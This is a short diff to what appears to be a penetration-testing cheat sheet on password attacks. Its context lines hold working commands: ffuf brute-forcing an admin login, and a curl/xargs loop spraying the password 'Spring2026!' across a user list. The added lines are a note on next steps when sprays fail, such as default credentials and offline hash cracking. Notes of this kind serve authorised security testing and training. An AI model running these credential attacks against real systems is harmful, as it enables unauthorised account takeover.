@@ -946,3 +946,5 @@ ffuf -w pass.txt -X POST -d "u=admin&p=FUZZ" \
 xargs -a users.txt -P 5 -I{} bash -c \
   'curl -s -d "u={}&p=Spring2026!" http://<TARGET>/login | grep -q Invalid || echo "[+] {}"'
 ```
+
+> **All sprays failed?** (1) Revisit user enumeration for missed accounts. (2) Try default/vendor creds from attacking-common-applications.md. (3) If you captured hashes, escalate to offline cracking (password-cracking.md). (4) Return to enumeration-methodology.md for alternate attack surfaces.
